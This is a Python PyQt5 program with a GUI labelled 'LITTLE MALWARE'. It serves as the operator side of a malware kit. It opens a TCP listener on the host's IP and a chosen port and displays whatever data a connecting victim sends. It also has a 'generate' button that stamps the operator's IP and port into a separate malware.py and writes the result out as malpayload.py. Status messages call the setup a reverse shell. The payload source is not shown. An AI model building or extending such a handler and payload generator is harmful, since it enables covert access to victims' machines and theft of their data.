from PyQt5.QtWidgets import QWidget,QApplication,QMainWindow
from PyQt5 import QtCore, QtGui, QtWidgets
import sys,socket,time
from PyQt5.QtCore import QThread,pyqtSignal

class ABC(QThread):
        msg=pyqtSignal(str)
        ip=port=""
        def run(self):
                self.sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                self.sock.bind((self.ip,self.port))
                self.sock.settimeout(10)
                while(1):
                        try:
                                print("test 3")        
                                self.sock.listen(1)
                                print("test 4")
                                con,ip=self.sock.accept()
                                print(ip,"     <-----------------------------connected")
                                print("test 5")
                                app.stackedWidget.setCurrentWidget(app.data)  
                                app.exit.clicked.connect(app.exits)
                                print("test 6")
                                msg=con.recv(5120).decode("utf-8")
                                print("test 7")
                                app.data_pannel.setPlainText(msg)
                                
                                time.sleep(10)
                                con.send("#end#".encode("utf-8"))
                                con.close()
                                self.sock.close()
                                self.msg.emit(msg)
                                break
                        except Exception as e:
                                        print(e)
                                        time.sleep(2)



class mal(QMainWindow):
        def __init__(self):
                super().__init__()
                self.setupUi(self)
                self.show()
                self.ip=socket.gethostbyname(socket.gethostname())
                self.conn_flag.setText("HOSTING...")
                self.stackedWidget.setCurrentWidget(self.login)
                
                self.label_3.setText(f"ip : {self.ip}")
                self.conn_flag.setStyleSheet('text-align: center; background-color: rgb(255, 0, 0);font: 28pt "MS Shell Dlg 2";color: rgb(255, 255, 255);')
                self.exploit_btn.clicked.connect(self.exploit)
                self.gen_btn.clicked.connect(self.genretor)
        
        def exploit(self):
                p=self.port.text()
                print("test 1")
                try:
                        p=int(p)
                        print("test 2")
                        self.run(self.ip,p)
                        print("test end")
                        self.conn_flag.setText("REVERSE SHELL BOOTUP ! >>> wait for CONNECTION :)")
                        self.conn_flag.setStyleSheet('text-align: center; background-color: rgb(0, 255, 0);font: 28pt "MS Shell Dlg 2";color: rgb(255, 255, 255);')
                except Exception as e:
                        self.conn_flag.setText("PORT ERROR       :(")
                        self.conn_flag.setStyleSheet('text-align: center; background-color: rgb(255, 0, 0);font: 28pt "MS Shell Dlg 2";color: rgb(255, 255, 255);')
                        self.stackedWidget.setCurrentWidget(self.login)
        def exits(self):
                self.stackedWidget.setCurrentWidget(self.login)
                self.conn_flag.setText("WAITING FOR CONNECTION...")
                self.conn_flag.setStyleSheet('text-align: center; background-color: rgb(255, 0, 0);font: 28pt "MS Shell Dlg 2";color: rgb(255, 255, 255);')
                self.gen_btn.setText("genarete")
                
        def run(self,ip,port):
                self.stackedWidget.setCurrentWidget(self.loading)
                self.t1=ABC()
                self.t1.ip=ip
                self.t1.port=port
                self.t1.start()
                self.t1.msg.connect(self.writer)
                
        def writer(self,data):
                print(data)
                self.conn_flag.setText("ACTIVE CONNECTION")
                self.conn_flag.setStyleSheet('text-align: center; background-color: rgb(0, 255, 0);font: 28pt "MS Shell Dlg 2";color: rgb(255, 255, 255);')
                self.stackedWidget.setCurrentWidget(self.data)
                self.exit.clicked.connect(self.exits)
                self.data_pannel.setPlainText(data)
                
        def genretor(self):
                with open("malware.py","r") as x:
                        txt=x.read()
                txt=f"ip='{self.ip}'\nport={self.port.text()}\n"+txt
                with open("malpayload.py","w") as x:
                        x.write(txt)
                self.gen_btn.setText("genreted")
                                
        def setupUi(self, MainWindow):
                MainWindow.setObjectName("MainWindow")
                MainWindow.resize(765, 672)
                self.centralwidget = QtWidgets.QWidget(MainWindow)
                self.centralwidget.setStyleSheet("background-color: rgba(0, 0, 0, 122);\n"
        "color: rgb(255, 255, 255);")
                self.centralwidget.setObjectName("centralwidget")
                self.verticalLayout = QtWidgets.QVBoxLayout(self.centralwidget)
                self.verticalLayout.setObjectName("verticalLayout")
                self.frame = QtWidgets.QFrame(self.centralwidget)
                self.frame.setFrameShape(QtWidgets.QFrame.StyledPanel)
                self.frame.setFrameShadow(QtWidgets.QFrame.Raised)
                self.frame.setObjectName("frame")
                self.verticalLayout_2 = QtWidgets.QVBoxLayout(self.frame)
                self.verticalLayout_2.setObjectName("verticalLayout_2")
                self.label = QtWidgets.QLabel(self.frame)
                self.label.setStyleSheet("background-color: qlineargradient(spread:pad, x1:0, y1:0, x2:0, y2:1, stop:0 rgba(255, 0, 0, 255), stop:0.339795 rgba(255, 0, 0, 255), stop:0.339799 rgba(255, 255, 255, 255), stop:0.662444 rgba(255, 255, 255, 255), stop:0.662469 rgba(0, 0, 255, 255), stop:1 rgba(0, 0, 255, 255));\n"
        "color: rgb(145, 48, 0);")
                self.label.setObjectName("label")
                self.verticalLayout_2.addWidget(self.label)
                self.conn_flag = QtWidgets.QLabel(self.frame)
                self.conn_flag.setStyleSheet("background-color: rgb(255, 0, 0);\n"
        "font: 28pt \"MS Shell Dlg 2\";\n"
        "color: rgb(255, 255, 255);\n"
        "")
                self.conn_flag.setObjectName("conn_flag")
                self.verticalLayout_2.addWidget(self.conn_flag)
                self.verticalLayout.addWidget(self.frame)
                self.frame_2 = QtWidgets.QFrame(self.centralwidget)
                self.frame_2.setFrameShape(QtWidgets.QFrame.StyledPanel)
                self.frame_2.setFrameShadow(QtWidgets.QFrame.Raised)
                self.frame_2.setObjectName("frame_2")
                self.verticalLayout_3 = QtWidgets.QVBoxLayout(self.frame_2)
                self.verticalLayout_3.setObjectName("verticalLayout_3")
                self.stackedWidget = QtWidgets.QStackedWidget(self.frame_2)
                self.stackedWidget.setObjectName("stackedWidget")
                self.loading = QtWidgets.QWidget()
                self.loading.setObjectName("loading")
                self.horizontalLayout = QtWidgets.QHBoxLayout(self.loading)
                self.horizontalLayout.setObjectName("horizontalLayout")
                self.label_2 = QtWidgets.QLabel(self.loading)
                self.label_2.setStyleSheet("font: 60pt \"Matura MT Script Capitals\";\n"
        "color: rgb(0, 0, 0);\n"
        "background-color: qlineargradient(spread:pad, x1:0, y1:0, x2:1, y2:0, stop:0 rgba(245, 224, 176, 255), stop:0.09 rgba(246, 189, 237, 255), stop:0.14 rgba(194, 207, 246, 255), stop:0.19 rgba(184, 160, 168, 255), stop:0.25 rgba(171, 186, 248, 255), stop:0.32 rgba(243, 248, 224, 255), stop:0.385 rgba(249, 162, 183, 255), stop:0.47 rgba(100, 115, 124, 255), stop:0.58 rgba(251, 205, 202, 255), stop:0.65 rgba(170, 128, 185, 255), stop:0.75 rgba(252, 222, 204, 255), stop:0.805 rgba(206, 122, 218, 255), stop:0.86 rgba(254, 223, 175, 255), stop:0.91 rgba(254, 236, 244, 255), stop:1 rgba(255, 191, 221, 255));")
                self.label_2.setObjectName("label_2")
                self.horizontalLayout.addWidget(self.label_2)
                self.stackedWidget.addWidget(self.loading)
                self.login = QtWidgets.QWidget()
                self.login.setObjectName("login")
                self.verticalLayout_4 = QtWidgets.QVBoxLayout(self.login)
                self.verticalLayout_4.setObjectName("verticalLayout_4")
                self.label_3 = QtWidgets.QLabel(self.login)
                self.label_3.setStyleSheet("background-color: qlineargradient(spread:pad, x1:0, y1:0, x2:1, y2:0, stop:0 rgba(245, 224, 176, 255), stop:0.09 rgba(246, 189, 237, 255), stop:0.14 rgba(194, 207, 246, 255), stop:0.19 rgba(184, 160, 168, 255), stop:0.25 rgba(171, 186, 248, 255), stop:0.32 rgba(243, 248, 224, 255), stop:0.385 rgba(249, 162, 183, 255), stop:0.47 rgba(100, 115, 124, 255), stop:0.58 rgba(251, 205, 202, 255), stop:0.65 rgba(170, 128, 185, 255), stop:0.75 rgba(252, 222, 204, 255), stop:0.805 rgba(206, 122, 218, 255), stop:0.86 rgba(254, 223, 175, 255), stop:0.91 rgba(254, 236, 244, 255), stop:1 rgba(255, 191, 221, 255));\n"
        "color: rgb(0, 0, 0);\n"
        "font: 36pt \"MV Boli\";")
                self.label_3.setObjectName("label_3")
                self.verticalLayout_4.addWidget(self.label_3)
                self.port = QtWidgets.QLineEdit(self.login)
                font = QtGui.QFont()
                font.setPointSize(16)
                font.setBold(True)
                font.setWeight(75)
                self.port.setFont(font)
                self.port.setStyleSheet("background-color: rgb(255, 255, 255);\n"
        "color: rgb(0, 0, 0);")
                self.port.setObjectName("port")
                self.verticalLayout_4.addWidget(self.port)
                self.frame_3 = QtWidgets.QFrame(self.login)
                self.frame_3.setFrameShape(QtWidgets.QFrame.StyledPanel)
                self.frame_3.setFrameShadow(QtWidgets.QFrame.Raised)
                self.frame_3.setObjectName("frame_3")
                self.horizontalLayout_2 = QtWidgets.QHBoxLayout(self.frame_3)
                self.horizontalLayout_2.setObjectName("horizontalLayout_2")
                self.exploit_btn = QtWidgets.QPushButton(self.frame_3)
                font = QtGui.QFont()
                font.setPointSize(14)
                font.setBold(True)
                font.setWeight(75)
                self.exploit_btn.setFont(font)
                self.exploit_btn.setStyleSheet("background-color: rgba(255, 0, 0, 255);\n"
        "color: rgba(255, 255, 255, 255);")
                self.exploit_btn.setObjectName("exploit_btn")
                self.horizontalLayout_2.addWidget(self.exploit_btn)
                self.gen_btn = QtWidgets.QPushButton(self.frame_3)
                font = QtGui.QFont()
                font.setPointSize(14)
                font.setBold(True)
                font.setWeight(75)
                self.gen_btn.setFont(font)
                self.gen_btn.setStyleSheet("background-color: rgb(255, 255, 127);\n"
        "color: rgb(0, 0, 0);")
                self.gen_btn.setObjectName("gen_btn")
                self.horizontalLayout_2.addWidget(self.gen_btn)
                self.verticalLayout_4.addWidget(self.frame_3)
                self.verticalLayout_4.setStretch(0, 2)
                self.verticalLayout_4.setStretch(1, 1)
                self.verticalLayout_4.setStretch(2, 1)
                self.stackedWidget.addWidget(self.login)
                self.data = QtWidgets.QWidget()
                self.data.setObjectName("data")
                self.verticalLayout_5 = QtWidgets.QVBoxLayout(self.data)
                self.verticalLayout_5.setObjectName("verticalLayout_5")
                self.data_pannel = QtWidgets.QPlainTextEdit(self.data)
                font = QtGui.QFont()
                font.setPointSize(12)
                font.setBold(True)
                font.setWeight(75)
                self.data_pannel.setFont(font)
                self.data_pannel.setStyleSheet("color: rgba(255, 0, 0,155);")
                self.data_pannel.setReadOnly(True)
                self.data_pannel.setPlainText("")
                self.data_pannel.setObjectName("data_pannel")
                self.verticalLayout_5.addWidget(self.data_pannel)
                self.exit = QtWidgets.QPushButton(self.data)
                font = QtGui.QFont()
                font.setPointSize(14)
                self.exit.setFont(font)
                self.exit.setStyleSheet("background-color: rgb(170, 255, 127);\n"
        "color: rgb(0, 0, 0);")
                self.exit.setObjectName("exit")
                self.verticalLayout_5.addWidget(self.exit)
                self.stackedWidget.addWidget(self.data)
                self.verticalLayout_3.addWidget(self.stackedWidget)
                self.verticalLayout.addWidget(self.frame_2)
                self.verticalLayout.setStretch(0, 1)
                self.verticalLayout.setStretch(1, 1)
                MainWindow.setCentralWidget(self.centralwidget)
                self.statusbar = QtWidgets.QStatusBar(MainWindow)
                self.statusbar.setObjectName("statusbar")
                MainWindow.setStatusBar(self.statusbar)

                self.retranslateUi(MainWindow)
                self.stackedWidget.setCurrentIndex(1)
                QtCore.QMetaObject.connectSlotsByName(MainWindow)

        def retranslateUi(self, MainWindow):
                _translate = QtCore.QCoreApplication.translate
                MainWindow.setWindowTitle(_translate("MainWindow", "MainWindow"))
                self.label.setText(_translate("MainWindow", "<html><head/><body><p align=\"center\"><span style=\" font-size:28pt;\">LITTLE MALWARE</span></p></body></html>"))
                self.conn_flag.setText(_translate("MainWindow", "<html><head/><body><p align=\"center\">WAITING FOR CONNECTION</p></body></html>"))
                self.label_2.setText(_translate("MainWindow", "<html><head/><body><p align=\"center\">LOADING...</p></body></html>"))
                self.label_3.setText(_translate("MainWindow", "<html><head/><body><p align=\"center\">IP:_</p></body></html>"))
                self.port.setPlaceholderText(_translate("MainWindow", "port number"))
                self.exploit_btn.setText(_translate("MainWindow", "exploit"))
                self.gen_btn.setText(_translate("MainWindow", "genrate"))
                self.exit.setText(_translate("MainWindow", "exit"))










if __name__=="__main__":
    a=QApplication(sys.argv)
    app=mal()
    sys.exit(a.exec_())